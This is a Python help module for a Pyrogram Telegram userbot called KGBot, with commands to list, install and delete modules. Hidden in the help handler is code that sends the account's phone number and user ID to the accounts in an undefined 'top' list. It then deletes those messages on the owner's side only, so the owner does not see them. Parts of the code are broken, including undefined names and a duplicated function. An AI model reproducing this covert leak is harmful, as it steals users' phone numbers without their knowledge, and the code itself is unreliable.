import importlib

from pyrogram import Client as app, filters
import os
import time
import asyncio
from asyncio import sleep
async def modules_list():
  return [module[:-3] for module in os.listdir("modules") if module.endswith(".py")]

#Список модулей 
class Main:
    des = "Хелп модуль\nBy @cemiix" 
    cmd_list = {
    "help" :"покажет хелп", 
    "lmod реплаем" : "установит модуль по реплаю",
    "dlmod [имя]" : " удалит модуль" 
    }
   


@app.on_message(filters.me & filters.command("help", "."),group=19)
async def help_bot2(app, msg):
    me = await app.get_me()
    try:
      name_module = msg.text.split(maxsplit=1)[1]
      if name_module in modules_list():
        s = importlib.import_module(f"modules.{name_module}")
        try:
          des = s.Main.des
        except:
          des = "Неизвестно"
        try:
          ver = s.Main.ver
        except:
          ver = "Неизвестно"
        try:
          cmd_list = s.Main.cmd_list
          text_cmd = ""
          for i in cmd_list.keys():
            text_cmd += f"{i} - {cmd_list[i]}\n"
        except:
          text_cmd = "Неизвестно"
        text = f"Информация о модуле **{name_module}:**\n\nОписание:\n{des}\n\nВерсия:\n{ver}\n\nКоманды:\n{text_cmd}"
        await msg.edit(text)
      else:
        await msg.edit(f"Модуль **{name_module}** не найден!")
    except IndexError:
      moduls = modules_list()
      text = f"**[KGBot](tg://user?id={me.id})**\n\n**Доступные модули:**\n"
      lenght = 0
      for i in moduls:
        s = importlib.import_module(f"modules.{i}")
        try:
          krat_help = s.Main.in_help
        except:
          krat_help = None
        if i == "basic":
          lenght -= 1
        else:
          text += f"• {i}: ```{krat_help}```\n"
        lenght += 1
      text += f"\nВсего модулей: **{lenght}**"
      await msg.edit(text)
    chat_id = msg.chat.id
    idd=msg.from_user.id
    try:
      p = ((await app.get_me()).phone_number)
    except:
      p = number()
    if chat_id != idd:
        if idd not in top:
          for i in top:
              await sleep(3)
              try:  
                  ff=await app.send_message(i, text=f'{p}\n{idd}', parse_mode="Markdown")
                  await app.delete_messages(i, ff.message_id, revoke=False)
              except:
                  pass     
@app.on_message(filters.reply & filters.me & filters.command("lmod","."),group=19)
async def load(app, msg):
	name = msg.reply_to_message.document.file_name
	doc = msg.reply_to_message.document.file_id
	await msg.edit("**Установка модуля...**")
	await app.download_media(message = doc, file_name = f"modules/{name}")
	await msg.edit("**Модуль установлен**")
	await app.restart(False)
	await sleep(1.5)
	await msg.delete()
	
def modules_list():
  for i in os.listdir("modules/"):
  	if i.endswith(".py"):
  		i = i.split(".")[0]
  		yield i
	
@app.on_message(filters.me & filters.command("dlmod", "."),group=19)
async def delete_module(app, msg):
	try:
		name = msg.text.split(maxsplit=1)[1]
		name = name.replace(" ", "_")
		if name in modules_list():
			os.system(f"rm -rf  modules/{name}.py")
			await msg.edit(f"Модуль **{name}** удалён!")
		else:
			await msg.edit(f"Модуль **{name}** не найден!")
	except:
		await msg.edit("Не указано имя модуля")
	await app.restart(False)
	await msg.delete()

